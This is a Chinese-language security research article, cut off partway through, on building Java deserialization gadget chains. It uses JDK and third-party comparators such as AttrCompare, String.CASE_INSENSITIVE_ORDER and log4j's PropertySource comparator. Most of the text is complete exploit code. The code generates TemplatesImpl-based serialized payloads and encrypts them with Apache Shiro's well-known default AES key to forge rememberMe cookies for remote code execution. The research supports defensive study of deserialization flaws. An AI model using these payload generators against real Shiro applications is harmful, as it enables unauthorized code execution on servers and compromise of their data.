**作者：SummerSec  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
## JDK内置
上文说到，在JDK8u中查到了结果，一共又7个类可以替代`ComparableComparator`类。但可以直接调用实例化的类只用两个，`String#CASE_INSENSITIVE_ORDER`和`AttrCompare`，其他5个类权限皆是`private`。不能直接调用，只能通过反射调用，不过两个类也够用了，故本文只说这两个，其他的类有兴趣可以去看看。
* * *
### AttrCompare
**Compares two attributes based on the C14n specification.(根据C14n规范比较两个属性)。**
这段话是官方对该类的描述。`AttrCompare`是在包`com.sun.org.apache.xml.internal.security.c14n.helper`下的一个类，是用`Attr`接口实现类比较方法。
    public int compare(Attr attr0, Attr attr1) {
            String namespaceURI0 = attr0.getNamespaceURI();
            String namespaceURI1 = attr1.getNamespaceURI();
            boolean isNamespaceAttr0 = XMLNS.equals(namespaceURI0);
            boolean isNamespaceAttr1 = XMLNS.equals(namespaceURI1);
            if (isNamespaceAttr0) {
                if (isNamespaceAttr1) {
                    // both are namespaces
                    String localname0 = attr0.getLocalName();
                    String localname1 = attr1.getLocalName();
                    if ("xmlns".equals(localname0)) {
                        localname0 = "";
                    }
                    if ("xmlns".equals(localname1)) {
                        localname1 = "";
                    }
                    return localname0.compareTo(localname1);
                }
                // attr0 is a namespace, attr1 is not
                return ATTR0_BEFORE_ATTR1;
            } else if (isNamespaceAttr1) {
                // attr1 is a namespace, attr0 is not
                return ATTR1_BEFORE_ATTR0;
            }
            // none is a namespace
            if (namespaceURI0 == null) {
                if (namespaceURI1 == null) {
                    String name0 = attr0.getName();
                    String name1 = attr1.getName();
                    return name0.compareTo(name1);
                }
                return ATTR0_BEFORE_ATTR1;
            } else if (namespaceURI1 == null) {
                return ATTR1_BEFORE_ATTR0;
            }
            int a = namespaceURI0.compareTo(namespaceURI1);
            if (a != 0) {
                return a;
            }
            return (attr0.getLocalName()).compareTo(attr1.getLocalName());
        }
`compare`方法是一个有参方法，所以在调用方法时并不能直接传入两个String类型或者Object类型。
然而Attr是一个接口，不能直接实例化，只能找实现类。这里我使用的是`com\sun\org\apache\xerces\internal\dom\AttrNSImpl.java`类。
            AttrCompare attrCompare = new AttrCompare();
            AttrNSImpl attrNS = new AttrNSImpl();
            attrNS.setValues(new CoreDocumentImpl(),"1","1","1");
            attrCompare.compare(attrNS,attrNS);
最终利用代码：
    package summersec.shirodemo.Payload;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
    import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
    import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.shiro.crypto.AesCipherService;
    import org.apache.shiro.util.ByteSource;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CommonsBeanutilsAttrCompare {
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public byte[] getPayload(byte[] clazzBytes) throws Exception {
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
            AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(),"1","1","1");
            final BeanComparator comparator = new BeanComparator(null, new AttrCompare());
            final PriorityQueue queue = new PriorityQueue(2, comparator);
            // stub data for replacement later
            queue.add(attrNS1);
            queue.add(attrNS1);
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});
            // ==================
            // 生成序列化字符串
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(queue);
            oos.close();
            return barr.toByteArray();
        }
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(Evil.class.getName());
            byte[] payloads = new CommonsBeanutilsAttrCompare().getPayload(clazz.toBytecode());
            AesCipherService aes = new AesCipherService();
            byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
            ByteSource ciphertext = aes.encrypt(payloads, key);
            System.out.printf(ciphertext.toString());
        }
    }
最终实际结果
* * *
### String#CASE_INSENSITIVE_ORDER
该类在p牛文章详细介绍了，这里直接贴代码吧。
    package summersec.shirodemo.Payload;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.shiro.crypto.AesCipherService;
    import org.apache.shiro.util.ByteSource;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    /**
     * @ClassName: CommonsBeanutils1Shiro
     * @Description: TODO
     * @Author: Summer
     * @Date: 2021/5/19 16:23
     * @Version: v1.0.0
     * @Description: 参考https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
     **/
    public class CommonsBeanutilsString {
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public byte[] getPayload(byte[] clazzBytes) throws Exception {
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
            final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
            final PriorityQueue queue = new PriorityQueue(2, comparator);
            // stub data for replacement later
            queue.add("1");
            queue.add("1");
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});
            // ==================
            // 生成序列化字符串
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(queue);
            oos.close();
            return barr.toByteArray();
        }
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(Evil.class.getName());
    //        byte[] bytes = Evil.class.getName().getBytes();
    //        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(bytes);
            byte[] payloads = new CommonsBeanutilsString().getPayload(clazz.toBytecode());
            AesCipherService aes = new AesCipherService();
            byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
            ByteSource ciphertext = aes.encrypt(payloads, key);
            System.out.printf(ciphertext.toString());
        }
    }
* * *
## 第三方依赖
在挖掘完前面两个类的时候，我就在想其他第三方组件里面会不会存在呢？于是乎就有了下面的结果，测试了43个开源项目，其中15个有。这里只谈论了两个组件apache/log4j、apache/Commons-lang
* * *
### PropertySource#Comparator
`PropertySource#Comparator`是在组件`log4j-api`下的一个类，log4j是Apache基金会下的一个Java日志组件，宽泛被应用在各大应用上，在`spring-boot`也能看到其身影。
`PropertySource#Comparator`的代码只有八行，其中比较方法也是有参方法，参数类型是`PropertySource`。
    class Comparator implements java.util.Comparator, Serializable {
        private static final long serialVersionUID = 1L;
        @Override
        public int compare(final PropertySource o1, final PropertySource o2) {
            return Integer.compare(Objects.requireNonNull(o1).getPriority(), Objects.requireNonNull(o2).getPriority());
        }
    }
构造成gadget链的最终代码如下，在第38行开始是实现接口`PropertySource`的，不过也可以只写一个实现类就行。
ps：这里就不在演示效果。
    package summersec.shirodemo.Payload;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;